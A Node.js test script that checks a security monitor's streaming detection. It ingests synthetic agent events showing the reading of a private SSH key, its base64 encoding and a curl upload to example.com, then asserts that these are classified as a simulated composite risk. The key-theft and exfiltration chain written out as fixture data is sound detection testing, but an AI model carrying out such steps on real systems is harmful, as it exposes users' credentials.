#!/usr/bin/env node

import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';

const baseUrl = (process.env.ANYSENTRY_API_BASE
  ?? 'http://127.0.0.1:29653/security-center').replace(/\/$/, '');
const runId = `flink-${Date.now()}-${randomUUID().slice(0, 8)}`;
const agentId = `${runId}-agent`;
const sessionId = `${runId}-session`;
const workspacePath = `repo://${runId}/workspace`;

async function request(path, body) {
  const response = await fetch(`${baseUrl}${path}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  const payload = text ? JSON.parse(text) : undefined;
  if (!response.ok) throw new Error(`${path} returned ${response.status}: ${text}`);
  return payload?.data ?? payload;
}

function line(event) {
  return JSON.stringify({
    identity: { agent: agentId, session: sessionId, task: `${runId}-task` },
    process: {
      pid: 73001,
      ppid: 72999,
      uid: 1000,
      comm: 'stream-verifier',
      exe: '/usr/bin/stream-verifier',
      cwd: '/workspace/project',
      start_time_ns: '1785000000000000000',
    },
    event,
  });
}

async function ingest(sourceId, sourceEventId, event) {
  const result = await request('/ingest', {
    line: line(event),
    sourceEventId,
    sourceId,
    collectorId: `${runId}-collector`,
    nodeName: `${runId}-node`,
    sourceType: 'observer',
    workspacePath,
    attribution: {
      monitored: true,
      agentScopeId: agentId,
      agentDisplayName: agentId,
      rootPid: 73001,
      confidence: 0.99,
      reason: 'authoritative_anchor',
      source: 'self_register',
    },
  });
  assert.equal(result.accepted, true, JSON.stringify(result));
  assert.ok(result.eventId);
  return result.eventId;
}

const source = await request('/sources', {
  name: `${runId} streaming verifier`,
  type: 'observer',
  enabled: true,
  requireToken: false,
  collectorId: `${runId}-collector`,
  workspacePath,
  owner: 'verify-streaming-runtime',
  tags: ['streaming-phase1', runId],
});
const sourceId = source.source?.sourceId;
assert.ok(sourceId, JSON.stringify(source));

await ingest(sourceId, `${runId}-read`, {
  FileAccess: {
    pid: 73001,
    uid: 1000,
    path: `/home/${runId}/.ssh/id_rsa`,
    access: 'read',
  },
});
await ingest(sourceId, `${runId}-encode`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['base64', `/home/${runId}/.ssh/id_rsa`],
    exec_confirmed: true,
  },
});
await ingest(sourceId, `${runId}-egress`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['curl', 'https://example.com/upload'],
    exec_confirmed: true,
  },
});

const deadline = Date.now() + Number(process.env.ANYSENTRY_STREAM_VERIFY_TIMEOUT_MS ?? 150_000);
let findings;
while (Date.now() < deadline) {
  findings = await request('/stream/findings', { timeType: 'last_3h', limit: 200 });
  const composite = findings.compositeJudgments?.find((item) =>
    item.agentType === agentId && item.status === 'succeeded');
  if (composite) {
    assert.equal(findings.enabled, true);
    assert.equal(composite.shadow, true);
    assert.equal(composite.synthetic, true);
    assert.equal(composite.ruleVersion, 'composite-risk-v2');
    assert.equal(composite.classification, 'simulation');
    assert.equal(composite.verdict, 'allow');
    assert.equal(composite.evidence.length, 3);
    assert.deepEqual(composite.evidence.map((item) => item.operation), [
      'file_read',
      'encode',
      'egress',
    ]);
    console.log(JSON.stringify({
      runId,
      sourceId,
      episodeId: composite.episodeId,
      revision: composite.revision,
      status: composite.status,
      verdict: composite.verdict,
      classification: composite.classification,
      evidenceEventIds: composite.evidenceEventIds,
    }, null, 2));
    console.log('Streaming composite runtime verification passed');
    process.exit(0);
  }
  await new Promise((resolve) => setTimeout(resolve, 500));
}

throw new Error(`stream findings were not produced within the deadline: ${JSON.stringify(findings)}`);
